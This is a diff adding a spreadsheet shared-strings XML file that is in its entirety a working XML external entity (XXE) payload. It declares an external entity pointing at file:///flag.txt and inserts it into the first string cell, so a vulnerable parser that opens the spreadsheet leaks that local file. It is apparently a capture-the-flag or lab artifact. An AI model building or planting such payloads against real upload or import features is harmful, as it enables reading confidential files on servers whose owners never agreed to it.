@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2">
+  <si>
+    <t>&xxe;</t>
+  </si>
+  <si>
+    <t>Another String</t>
+  </si>
+</sst>
+
